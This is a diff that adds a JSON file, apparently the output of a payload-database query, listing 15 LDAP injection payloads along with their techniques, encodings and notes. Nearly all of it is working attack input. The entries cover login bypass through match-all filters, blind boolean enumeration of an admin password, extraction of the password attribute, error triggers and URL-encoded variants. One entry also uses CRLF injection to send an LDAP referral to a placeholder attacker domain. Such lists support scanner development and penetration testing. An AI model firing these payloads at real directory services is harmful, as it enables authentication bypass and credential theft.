@@ -1,0 +1,275 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "ldap"
+  },
+  "count": 15,
+  "results": [
+    {
+      "id": "035fa24acf7c6830",
+      "payload": "admin)(\u0026)",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP filter injection — close parenthesis + always-true AND filter.",
+      "source": "ensphere",
+      "tags": [
+        "and",
+        "bypass",
+        "filter",
+        "ldap"
+      ]
+    },
+    {
+      "id": "06d64b8e7b60df52",
+      "payload": "admin)(|(cn=a*))",
+      "technique": "ldap_blind_boolean",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Blind LDAP boolean probe — true condition (cn starts with 'a'). Compare response to false.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "boolean",
+        "ldap",
+        "true"
+      ]
+    },
+    {
+      "id": "1e18a74ea3e51d87",
+      "payload": "%61%64%6d%69%6e%29%28%26%29",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "URL-encoded admin)(\u0026) LDAP injection.",
+      "source": "ensphere",
+      "tags": [
+        "filter",
+        "ldap",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "33481b75a3450012",
+      "payload": "*)(uid=*))(|(uid=*",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP filter injection via JSON body (REST API).",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "filter",
+        "json",
+        "ldap"
+      ]
+    },
+    {
+      "id": "4a9519795fdb44db",
+      "payload": "*)(\u0026(uid=admin)(userPassword=a*))",
+      "technique": "ldap_blind_boolean",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Blind LDAP password enumeration — check if password starts with 'a'.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "boolean",
+        "ldap",
+        "password_enum"
+      ]
+    },
+    {
+      "id": "58aa73e96d7a2100",
+      "payload": "admin)(|(cn=ZZZZZ*))",
+      "technique": "ldap_blind_boolean",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "boolean_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Blind LDAP boolean probe — false condition (unlikely cn prefix). Compare to true probe.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "boolean",
+        "false",
+        "ldap"
+      ]
+    },
+    {
+      "id": "5f281053575cca8e",
+      "payload": "\\00",
+      "technique": "ldap_blind_error",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP null byte injection — may cause LDAP protocol error.",
+      "source": "ensphere",
+      "tags": [
+        "error",
+        "ldap",
+        "null_byte"
+      ]
+    },
+    {
+      "id": "601959287eb53c5d",
+      "payload": "*)(objectClass=*))%0a%0dDN:COLLAB_DOMAIN",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 3,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "LDAP injection with CRLF attempting LDAP referral to attacker domain for OOB confirmation.",
+      "source": "ensphere",
+      "tags": [
+        "dns",
+        "ldap",
+        "oob",
+        "referral"
+      ]
+    },
+    {
+      "id": "6a23e082f3d0091b",
+      "payload": "*)(uid=*))(|(uid=*",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP wildcard filter injection. Closes filter, injects OR condition matching all users.",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "filter",
+        "ldap",
+        "wildcard"
+      ]
+    },
+    {
+      "id": "8250f276e05ed8cb",
+      "payload": "%2a%29%28%75%69%64%3d%2a%29%29%28%7c%28%75%69%64%3d%2a",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "URL-encoded LDAP wildcard filter injection.",
+      "source": "ensphere",
+      "tags": [
+        "filter",
+        "ldap",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "8d2fafe928eca9ad",
+      "payload": "*)(\u0026",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP injection — wildcard match with unclosed filter to trigger error or match-all.",
+      "source": "ensphere",
+      "tags": [
+        "filter",
+        "ldap",
+        "wildcard"
+      ]
+    },
+    {
+      "id": "9c66b2d7f1a2ea58",
+      "payload": "*)(|(password=*))",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP filter injection — extract password attribute via OR condition.",
+      "source": "ensphere",
+      "tags": [
+        "attribute_extraction",
+        "filter",
+        "ldap"
+      ]
+    },
+    {
+      "id": "c248d637a2b7436e",
+      "payload": "admin)(((",
+      "technique": "ldap_blind_error",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "error",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP syntax error trigger — unbalanced parentheses cause LDAP server error.",
+      "source": "ensphere",
+      "tags": [
+        "error",
+        "ldap",
+        "syntax"
+      ]
+    },
+    {
+      "id": "f0c5d7c39b401c1f",
+      "payload": "*)(uid=*))(|(uid=*",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP filter injection via form body (login form).",
+      "source": "ensphere",
+      "tags": [
+        "auth_bypass",
+        "filter",
+        "form",
+        "ldap"
+      ]
+    },
+    {
+      "id": "f17d81966cd68368",
+      "payload": "admin)(|(objectClass=*))",
+      "technique": "ldap_filter_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LDAP filter injection — match any objectClass after closing the legitimate filter.",
+      "source": "ensphere",
+      "tags": [
+        "filter",
+        "ldap",
+        "objectclass"
+      ]
+    }
+  ]
+}
